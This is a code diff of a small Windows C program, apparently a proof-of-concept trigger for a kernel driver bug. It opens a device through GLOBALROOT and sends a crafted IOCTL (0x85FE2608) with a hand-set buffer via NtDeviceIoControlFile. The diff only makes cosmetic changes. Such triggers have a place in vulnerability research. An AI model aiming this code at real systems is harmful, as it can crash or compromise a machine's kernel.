@@ -1,6 +1,5 @@
-#include <stdio.h>
+#include<stdio.h>
 #include <windows.h>
-
 typedef struct _IO_STATUS_BLOCK {
     union {
         NTSTATUS Status;
@@ -21,6 +20,7 @@ typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(
     PVOID            OutputBuffer,
     ULONG            OutputBufferLength
     );
+
 int main() {
 
     HANDLE hDriver = CreateFileA("\\\\.\\GLOBALROOT\\Device\\?", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
@@ -28,25 +28,25 @@ int main() {
 
     if (hDriver == INVALID_HANDLE_VALUE) {
         printf("[-] CreateFile (0x%X)\n", GetLastError());
-        return(-1);
+        getchar();
     }
-
-    LPCWSTR nt = L"ntdll";
-    HMODULE hntdll = GetModuleHandle(nt);
 
     IO_STATUS_BLOCK p = {};
 
-    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");
+    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtDeviceIoControlFile");
 
     if (!tDeviceIoControl) {
         printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());
-        system("pause");
+        getchar();
     }
+
     DWORD Buffer[0x20000]{};
 
     Buffer[0] = 1;
     Buffer[2] = 0xffff;
     tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x85FE2608, Buffer, 0x10, 0, 0);
+
+    getchar();
 
     return 0;
 }
